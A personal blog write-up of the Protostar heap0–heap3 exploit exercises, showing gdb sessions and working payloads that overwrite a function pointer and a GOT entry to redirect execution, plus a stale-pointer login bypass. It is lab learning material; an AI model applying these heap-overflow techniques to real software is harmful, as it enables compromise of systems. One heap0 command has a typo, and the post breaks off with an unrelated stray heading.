---
layout: post
title:  "Protostar Exploit Exercises: Heap challenges"
---

Welcome back y'all.

For those of you who are just joining us, we're currently in the
process of honing our binary hacking-skills. I recently completed the
formatting challenges in the same set of exercises gracefully provided
by exploit-exercises.com (which you can read about in my previous posts.)

I am writing these posts out of a personal interest in improving my
own skills and accomplishing something tangible in regards to
computer security; Something I can point to, and maybe even take some
pride in - However basic these challenges might be.

Enough talking, lets 'sploit some executables.

## [heap0](https://exploit-exercises.com/protostar/heap0)

* * * 

>### About
>
>This level introduces heap overflows and how they can influence code flow.

The code provided lays out a simple C-program which uses `malloc` to
allocate some memory for a couple of structures. The `f` structure is
(presumably) allocated right next to the `data`-structure on the heap.

A call to the function `strcpy`, which copies user-supplied
 data into the only member of the `data` structure without
any bounds-checking sets up a buffer overflow, for us to take advantage of.

### Crashing the process

Giving the program more than 63 `A`s will begin to overwrite any value
stored on the heap. And the function-pointer located right next to the
char-array will be overwritten, causing it to point to an invalid (in
the case below, `0x41414141`) location in memory.

~~~
$ /opt/protostar/bin/heap0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
~~~

### Redirecting execution

We start poking around the binary to find out where `winner` is located.

~~~
$ # Finding the address (left-most column) of the winner-function by running objdump -t
$ objdump -t /opt/protostar/bin/heap0 | grep -e " winner"
08048464 g	F	.text	00000014		winner
~~~

Now that we know what to overwrite the function-pointer with, we craft
our input with the help of python to gracefully complete this
challenge.

Note that we gave the program 72 bytes of garbage, because the two
variables are not located right next to eachother on the heap. I'm
guessing that this has to do with some padding or alignment
implemented by the standard library.

~~~
$ /opt/protostar/bin/heap0 `print -c "print 'A'*72+'\x64\x84\x04\x08'"`
data is located at 0x804a008, fp is at 0x804a050
level passed
~~~

## [heap1](https://exploit-exercises.com/protostar/heap1)

* * * 

>### About
>
>This level takes a look at code flow hijacking in data overwrite cases.

I have no idea how to go about exploiting this.

Let's channel our inner Ivan Drago and break stuff & hopefully we might learn something along the way.

Feeding the program a bunch of garbage makes the program crash
in `__GI_strcpy`

~~~
(gdb) start AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
(gdb) c
Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x41414141 <Address 0x41414141 out of bounds>, 
    src=0xbffffe7c 'B' <repeats 56 times>) at strcpy.c:40
(gdb) x/i $eip
0xb7f09df4 <*__GI_strcpy+20>:	mov    BYTE PTR [esi+edx*1+0x1],cl
(gdb) i r esi edx
esi            0x41414140	1094795584
edx            0x0	0
~~~

I noticed that up to around 20 `A`s are no problem for the program to
handle. Around 20+ is where things get wierd, the destination-address
provided to `strcpy` is being overwritten somehow. 

~~~
(gdb) run `python -c "print('A'*20+'\x11\xef\xcd\xab'+' a')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap1 `python -c "print('A'*20+'\x11\xef\xcd\xab'+' a')"`

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0xabcdef11 <Address 0xabcdef11 out of bounds>, 
    src=0xbffffeb3 "a") at strcpy.c:40
40	strcpy.c: No such file or directory.
	in strcpy.c
(gdb) 
~~~

Building upon previous knowledge, as gained in my previous post on the
formatting-challenges; What if we overwrite a address located in the
global-offset table using the bug above?

The puts-function (printf in the source-code) in main can be
overwritten, as it's the only function left to be called after strcpy
returns.

~~~
(gdb) shell objdump -TR /opt/protostar/bin/heap1

/opt/protostar/bin/heap1:     file format elf32-i386
...
08049774 R_386_JUMP_SLOT   puts
~~~

Winner is located at `0x08048494`.

And, putting it all together.

~~~
(gdb) run `python -c "print('A'*20+'\x74\x97\x04\x08'+' \x94\x84\x04\x08')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap1 `python -c "print('A'*20+'\x74\x97\x04\x08'+' \x94\x84\x04\x08')"`
and we have a winner @ 1454508194
~~~

![Billy boy]({{ site-url }}/assets/post_images/heap1_success.jpg)

### Lots to learn

My understanding on heap overflowing exploatation is limited. I've
skimmed through [this article](http://phrack.org/issues/57/9.html#article) 
but I need time to digest its entrails.

Initially I was totally clueless on how this would even be possible;
But somewhere along the way on trying to find out how heap-exploits
work under the hood, I figured I should atleast try to do it,
regardless of any understanding. I stopped reading and started trying.

It's a good feeling. Not having to explicitly know how every nook and
cranny in memory exploatation works, some more general skills might
apply.

I'm still trying to wrap my head around heap-exploits though.

## [heap2](https://exploit-exercises.com/protostar/heap2)

* * * 

>About
>
>This level examines what can happen when heap pointers are stale.
>
>This level is completed when you see the “you have logged in already!” message

~~~
$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth 0
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 00000000000000000000000000000000000000000000000000000
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
~~~

Freeing a malloc-allocated pointer without setting the pointer
to NULL leads to stuff like this. Not sure if I'm solving this
level the 'right' way.

## [heap3](https://exploit-exercises.com/protostar/heap3)

* * *

>About
>
>This level introduces the Doug Lea Malloc (dlmalloc) and how
>heap meta data can be modified to change program execution.

Reading [this article](http://phrack.org/issues/57/8.html#article) on
how the heap is managed. 

--[ 4 - Exploiting the Sudo vulnerability ]-----------------------------
